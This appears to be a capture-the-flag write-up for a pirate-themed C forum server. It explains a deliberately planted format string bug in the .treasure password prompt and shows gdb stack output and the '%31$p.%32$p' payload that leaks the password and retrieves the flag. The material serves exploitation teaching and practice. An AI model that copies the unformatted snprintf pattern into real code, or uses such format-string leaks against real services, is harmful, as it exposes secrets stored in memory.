# Pirate Prattle

Pirate Prattle is a TCP-server written in C that presents itself as a pirate-themed dark web forum service. The service contains various logs dictating/accounting the achievements of scammers. The service contains the following file types:

- .log files: these are standard log files without any password protection
- .treasure files: these files are protected by a password input that contain a format string vulnerability

# Vulnerabilities

## Vulnerability #1 - Parrot echoes password back

- Category: Format string
- Difficulty: Medium

When trying to access .treasure files, the guarding parrot echoes back your words after each attempt. However, her words are printed without format specifiers, meaning the attempted password "%p" would give back a pointer read from the stack.

# Exploits

## Vulnerability #1 - Parrot echoes password back

### Discover vulnerability

Find the following code in the cat_file function in cli.c

```
// If this is a .treasure file, ask for a password to open
    if (strstr(filename, ".treasure") != NULL)
    {
        char correct_password[256];
        generate_password(correct_password, 16);
        WRITE_TO_BUFFER(session, "A parrot is guarding the treasure tightly\n");
        WRITE_TO_BUFFER(session, "Speak your words: ");
        send(session->sock, session->buffer, strlen(session->buffer), 0);
        memset(session->buffer, 0, sizeof(session->buffer));
        int read_size;
        char password_input[256];
        read_size = recv(session->sock, password_input, 256, 0);
        // Null-terminate and remove newline
        password_input[read_size] = '\0';
        trim_whitespace(password_input);
        fflush(stdout);
        WRITE_TO_BUFFER(session, password_input);
        WRITE_TO_BUFFER(session, ", ");
        WRITE_TO_BUFFER(session, password_input);
        WRITE_TO_BUFFER(session, ", captain!\n");
        if (strncmp(password_input, correct_password, 255) != 0)
        {
            return;
        }

```

Notice that the _WRITE_TO_BUFFER_ macro implements a _snprintf_, but isn't provided any format specifiers here. The actual password is stored in _correct_password_ on the stack just a few lines above, meaning this output is vulnerable to a stack read. (it also looks vulnerable to a stack write with %n, but they have been automatically filtered out as part of _trim_whitespace_ to prevent seg faults)

If we run our server with gdb and set a break point for the line where the password is first printed out, we can inspect the stack to try and find the password. (Using gdb with gef for a prettier output in this example). Note: we need to connect with a client to the server and try to open the .treasure file and input an arbitrary password ("USERINPUT" in this case) to trigger the break point. The password is marked with a **// Note**-comment in the code block below.

```
sh-5.1# gdb my_server
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "aarch64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from my_server...
gef➤  break cli.c:254
Breakpoint 1 at 0x2b24: file cli.c, line 254.
gef➤  run
Starting program: /mnt/service/my_server
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".
Socket created
bind done
Waiting for incoming connections...
Connection accepted from 192.168.65.1:38487
[New Thread 0xfffff7e0f120 (LWP 547)]
[Switching to Thread 0xfffff7e0f120 (LWP 547)]

Thread 2 "my_server" hit Breakpoint 1, cat_file (filename=0xfffff7e08bfd "silver_bill_shipwreck.treasure", session=0xfffff7e0a830) at cli.c:254
warning: Source file is more recent than executable.
254	        WRITE_TO_BUFFER(session, password_input);










[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────── registers ────
$x0  : 0x0
$x1  : 0x0000fffff7fad788  →  0x0000000000000000
$x2  : 0x0000aaaaaaab62a0  →  "Connection accepted from 192.168.65.1:38487\n"
$x3  : 0x54
$x4  : 0x9
$x5  : 0x2
$x6  : 0x55504e4952455355 ("USERINPU"?)
$x7  : 0x5455504e495245
$x8  : 0x101010101010101
$x9  : 0x0000fffff7ffdb58  →  0x60e7fab86238c800
$x10 : 0xffffff80
$x11 : 0xffffffd8
$x12 : 0x1050
$x13 : 0xa796c7468676974  ("tightly\n"?)
$x14 : 0x0000fffff7e08bf8  →  "loot silver_bill_shipwreck.treasure"
$x15 : 0x0000fffff7e88b20  →  <_IO_str_init_static_internal+44> mov x19,  x0
$x16 : 0x1
$x17 : 0x0000fffff7e78de0  →  <fflush+0> cbz x0,  0xfffff7e78ec8 <__GI__IO_fflush+232>
$x18 : 0x0
$x19 : 0x4
$x20 : 0x0000fffff7e0d834  →  0x0000000000000000
$x21 : 0x0000fffffffff9ce  →  0x0000000000000100
$x22 : 0x80e960
$x23 : 0x0000fffffffff9cf  →  0x0000000000000001
$x24 : 0x0
$x25 : 0x0000fffff7600000  →  0x0000000000000000
$x26 : 0x80e960
$x27 : 0x0000fffff7ff7e80  →  0x0000000000000001
$x28 : 0x0000fffff7600000  →  0x0000000000000000
$x29 : 0x0000fffff7e078c0  →  0x0000fffff7e08b90  →  0x0000fffff7e0a800  →  0x0000fffff7e0e840  →  0x0000000000000000
$x30 : 0x0000aaaaaaaa2b24  →  <cat_file+620> ldr x1,  [sp,  #32]
$sp  : 0x0000fffff7e078c0  →  0x0000fffff7e08b90  →  0x0000fffff7e0a800  →  0x0000fffff7e0e840  →  0x0000000000000000
$pc  : 0x0000aaaaaaaa2b24  →  <cat_file+620> ldr x1,  [sp,  #32]
$cpsr: [negative ZERO CARRY overflow interrupt endian fast t32 m[4]]
$fpsr: 0x0
$fpcr: 0x0
───────────────────────────────────────────────────────────────────────────────── stack ────
0x0000fffff7e078c0│+0x0000: 0x0000fffff7e08b90  →  0x0000fffff7e0a800  →  0x0000fffff7e0e840  →  0x0000000000000000	 ← $x29, $sp
0x0000fffff7e078c8│+0x0008: 0x0000aaaaaaaa223c  →  <interact_cli+632> mov w0,  #0x0                   	// #0
0x0000fffff7e078d0│+0x0010: 0x0000000000000000
0x0000fffff7e078d8│+0x0018: 0x0000fffff7e0f53c  →  0x0000000000000000
0x0000fffff7e078e0│+0x0020: 0x0000fffff7e0a830  →  0x746e6d2f00000004
0x0000fffff7e078e8│+0x0028: 0x0000fffff7e08bfd  →  "silver_bill_shipwreck.treasure"
0x0000fffff7e078f0│+0x0030: 0x0000000000000000
0x0000fffff7e078f8│+0x0038: 0x0000000b00000000
─────────────────────────────────────────────────────────────────────────── code:arm64: ────
   0xaaaaaaaa2b18 <cat_file+608>   ldr    x0,  [x0,  #4056]
   0xaaaaaaaa2b1c <cat_file+612>   ldr    x0,  [x0]
   0xaaaaaaaa2b20 <cat_file+616>   bl     0xaaaaaaaa1460 <fflush@plt>
 → 0xaaaaaaaa2b24 <cat_file+620>   ldr    x1,  [sp,  #32]
   0xaaaaaaaa2b28 <cat_file+624>   mov    x0,  #0x3004                	// #12292
   0xaaaaaaaa2b2c <cat_file+628>   add    x19,  x1,  x0
   0xaaaaaaaa2b30 <cat_file+632>   ldr    x1,  [sp,  #32]
   0xaaaaaaaa2b34 <cat_file+636>   mov    x0,  #0x3004                	// #12292
   0xaaaaaaaa2b38 <cat_file+640>   add    x0,  x1,  x0
────────────────────────────────────────────────────────────────────── source:cli.c+254 ────
    249	         read_size = recv(session->sock, password_input, 256, 0);
    250	         // Null-terminate and remove newline
    251	         password_input[read_size] = '\0';
    252	         trim_whitespace(password_input);
    253	         fflush(stdout);
                          // password_input=0x0000fffff7e07a88  →  "USERINPUT", session=0x0000fffff7e078e0  →  [...]  →  0x746e6d2f00000004
●→  254	         WRITE_TO_BUFFER(session, password_input);
    255	         WRITE_TO_BUFFER(session, ", ");
    256	         WRITE_TO_BUFFER(session, password_input);
    257	         WRITE_TO_BUFFER(session, ", captain!\n");
    258	         if (strncmp(password_input, correct_password, 255) != 0)
    259	         {
─────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "my_server", stopped 0xfffff7ef7a40 in __libc_accept (), reason: BREAKPOINT
[#1] Id 2, Name: "my_server", stopped 0xaaaaaaaa2b24 in cat_file (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xaaaaaaaa2b24 → cat_file(filename=0xfffff7e08bfd "silver_bill_shipwreck.treasure", session=0xfffff7e0a830)
[#1] 0xaaaaaaaa223c → interact_cli(session=0xfffff7e0a830)
[#2] 0xaaaaaaaa1abc → client_session(socket_desc=0xaaaaaaab66b0)
[#3] 0xfffff7e8d5c8 → start_thread(arg=0x0)
[#4] 0xfffff7ef5edc → thread_start()
────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $sp -l 100
0x0000fffff7e078c0│+0x0000: 0x0000fffff7e08b90  →  0x0000fffff7e0a800  →  0x0000fffff7e0e840  →  0x0000000000000000	 ← $x29, $sp
0x0000fffff7e078c8│+0x0008: 0x0000aaaaaaaa223c  →  <interact_cli+632> mov w0,  #0x0                   	// #0
0x0000fffff7e078d0│+0x0010: 0x0000000000000000
0x0000fffff7e078d8│+0x0018: 0x0000fffff7e0f53c  →  0x0000000000000000
0x0000fffff7e078e0│+0x0020: 0x0000fffff7e0a830  →  0x746e6d2f00000004
0x0000fffff7e078e8│+0x0028: 0x0000fffff7e08bfd  →  "silver_bill_shipwreck.treasure"
0x0000fffff7e078f0│+0x0030: 0x0000000000000000
0x0000fffff7e078f8│+0x0038: 0x0000000b00000000
0x0000fffff7e07900│+0x0040: 0x0000000000000000
0x0000fffff7e07908│+0x0048: 0x0000000000000029 (")"?)
0x0000fffff7e07910│+0x0050: 0x0000000000000d7f
0x0000fffff7e07918│+0x0058: 0x00000001000081a4
0x0000fffff7e07920│+0x0060: 0x0000000000000000
0x0000fffff7e07928│+0x0068: 0x0000000000000000
0x0000fffff7e07930│+0x0070: 0x0000000000000000
0x0000fffff7e07938│+0x0078: 0x0000000000000164
0x0000fffff7e07940│+0x0080: 0x0000000000001000
0x0000fffff7e07948│+0x0088: 0x0000000000000008
0x0000fffff7e07950│+0x0090: 0x00000000664bc05c
0x0000fffff7e07958│+0x0098: 0x00000000155604df
0x0000fffff7e07960│+0x00a0: 0x00000000664bc05b
0x0000fffff7e07968│+0x00a8: 0x00000000014657e7
0x0000fffff7e07970│+0x00b0: 0x00000000664bc05b
0x0000fffff7e07978│+0x00b8: 0x00000000014657e7
0x0000fffff7e07980│+0x00c0: 0x0000000000000000
0x0000fffff7e07988│+0x00c8: "lC2yp64T&(@V7m&1" // NOTE: Password starts here!
0x0000fffff7e07990│+0x00d0: "&(@V7m&1"
0x0000fffff7e07998│+0x00d8: 0x0000000000000000
0x0000fffff7e079a0│+0x00e0: 0x0000000000000000
0x0000fffff7e079a8│+0x00e8: 0x0000000000000000
```

With a bit of trial and error, we soon find out that the 2x8 byte long password is stored with a positional offset of 31 and 32 on the stack.

### Exploit Vulnerability

Back in the client, we can input the string `%31$p.%32$p` as the password. The parrot will now reply with a hex pointer representation of the 2 addresses containing half of the 16-byte long password each. See the code block below:

```
anonymous4:/CutthroatCreek$ loot silver_bill_shipwreck.treasure
A parrot is guarding the treasure tightly
Speak your words: %31$p.%32$p
0x543436707932436c.0x31266d3756402826, 0x543436707932436c.0x31266d3756402826, captain!
```

The parrot always repeats the password twice, and due to specifying the offset (31 and 32) we then get the exact same output twice (as opposed to if we use `%p.%p` for example).

The output values are hex encodings of ascii in little-endian format. To get the actual password, we first manually convert to big-endian.

```
0x543436707932436c.0x31266d3756402826 -> 0x6c43327970363454.0x26284056376d2631
```

Using a [hex converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html) we can finally translate the password into ascii.

```
6c43327970363454 26284056376d2631 -> lC2yp64T&(@V7m&1
```

At last, putting this into the password field gives us access to the document with the flag.

```
anonymous4:/CutthroatCreek$ loot silver_bill_shipwreck.treasure
A parrot is guarding the treasure tightly
Speak your words: lC2yp64T&(@V7m&1
lC2yp64T&(@V7m&1, lC2yp64T&(@V7m&1, captain!
Scam Details:
----------------
Date: 2019-01-19
Time: 01:11 AM
Scammer: Silver Bill
Scammer ID: ENOFLAG123456789

Message: Ahoy mateys! I stumbled upon CutthroatCreek and discovered a shipwreck full of treasure and rum! I scavanged it all, except for the ship's old flag. It seemed useless, so I'll leave it for whoever comes next. Yo-ho-ho and away we go!
```

### Note

The reason we are not using %s, which at first glance might look better since it outputs a string in ascii, is that it treats the address provided to it as a pointer, dereferences it and then tries to read the string from there. In our case, the bytes of the password are stored directly on the stack itself, and not pointed to with a pointer.
